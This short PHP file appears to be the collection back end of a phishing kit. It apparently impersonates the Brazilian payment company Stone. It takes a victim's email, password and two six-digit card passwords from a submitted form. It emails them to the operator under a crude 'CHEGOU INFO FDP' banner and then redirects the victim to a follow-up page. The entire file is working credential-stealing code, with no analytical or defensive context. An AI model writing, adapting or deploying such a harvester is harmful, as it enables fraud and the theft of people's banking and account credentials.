<?php 
require './system/autoload.php';
header("Content-type: text/html; charset=utf-8");

$email = $_POST['email'];
$senha = $_POST['password'];
$senha6 = $_POST['senha6'];
$senhaRetry = $_POST['senhacard2'];

$teste = "<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
<div>
=====CHEGOU INFO FDP=====<br>
=========================<br>
EMAIL: $email <br>
SENHA: $senha <br>
SENHA6: $senha6 <br>
SENHA6 CONFIRMADA: $senhaRetry <br>
=========================
</div>
</body>
</html>
";



new EnviarEmail('[STONE]',$teste,"STONE");
new EnviarEmail('[STONE1]',$teste,"STONE");

header("location:liberacao.php");
 ?>
